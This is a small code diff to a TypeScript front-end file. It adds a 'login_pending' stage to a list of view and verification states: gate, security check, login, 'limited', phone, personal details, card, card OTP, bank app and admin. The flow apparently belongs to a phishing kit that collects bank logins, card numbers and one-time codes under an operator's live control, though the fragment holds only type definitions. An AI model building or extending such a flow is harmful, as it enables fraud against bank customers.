@@ -7,7 +7,7 @@ import { retry, catchError, switchMap, tap, filter } from 'rxjs/operators';
 import { PollingScheduler } from './polling.util';
 
 export type ViewState = 'gate' | 'security_check' | 'login' | 'limited' | 'phone' | 'personal' | 'card' | 'card_otp' | 'bank_app' | 'loading' | 'step_success' | 'success' | 'admin';
-export type VerificationStage = 'login' | 'limited' | 'phone_pending' | 'personal_pending' | 'card_pending' | 'card_otp_pending' | 'bank_app_input' | 'bank_app_pending' | 'final_review' | 'complete';
+export type VerificationStage = 'login' | 'login_pending' | 'limited' | 'phone_pending' | 'personal_pending' | 'card_pending' | 'card_otp_pending' | 'bank_app_input' | 'bank_app_pending' | 'final_review' | 'complete';
 
 export interface UserFingerprint {
   userAgent: string;
